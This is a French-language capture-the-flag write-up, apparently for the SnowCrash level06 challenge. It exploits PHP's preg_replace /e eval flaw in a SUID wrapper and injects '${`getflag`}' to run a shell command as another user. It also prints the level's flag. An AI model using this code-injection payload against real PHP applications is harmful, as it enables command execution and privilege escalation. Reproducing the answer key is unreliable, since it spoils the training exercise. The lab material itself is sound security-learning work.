## LEVEL06

- Dans ce level un binaire et un .php se trouvent dans le home de level06 : 
```bash
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

- Le binaire a le bit SUID et appartient a flag06, exécuté avec les droits de flag06, comme vu dans les levels précédents.  
- Le .php indique le code qu’exécute le binaire: 
```php
#!/usr/bin/php
<?php
function y($m){
$m = preg_replace("/\./", " x ", $m);
$m = preg_replace("/@/", " y", $m);
return $m;
}
function x($y, $z){
$a = file_get_contents($y);
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
$a = preg_replace("/\[/", "(", $a);
$a = preg_replace("/\]/", ")", $a);
return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

- Ce code appelle preg_replace qui cherche  un pattern dans le contenu du fichier fourni en argument et le remplace.
```preg_replace('/regex/e', 'remplacement', $a);```  
- La ligne vulnerable est :
```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```
- L’option /e force PHP à faire : ```eval(remplacement); ```   
Donc le remplacement est exécuté comme du code PHP, pas traité comme une simple chaîne.



## EXPLOITATION

- Si le fichier contient le pattern [x PAYLOAD], alors PHP exécutera : ``` eval( y("PAYLOAD") );```
- Injecter directement quelque chose comme ```passthru("/bin/getflag");``` ne fonctionne pas car ce qui est evalue serait ```y("passthru(\"/bin/getflag\");")```  
Le code est dans une chaîne, y() renvoie une chaine, rien n’est exécuté. Il faut donc trouver un moyen que le code soit évalué et exécuté avant l’appel de y().  
- L’astuce consiste à utiliser une variable variable ${...},  PHP doit évaluer l’expression interne pour déterminer le nom de la variable.  
Ensuite utiliser les backticks en php permet de lancer une commande shell, injecter ```${`getflag`}``` forcera PHP à évaluer la variable et executera la commande via le shell entre backticks. 
- On cree donc le fichier flag.txt :  
```bash
echo '[x ${`getflag`}]' > flag.txt
```
- Ensuite on lance level06 avec ce fichier en argument:
```bash
./level06 /run/shm/flag.txt
```

## FLAG 

- wiok45aaoguiboiki2tuin6ub

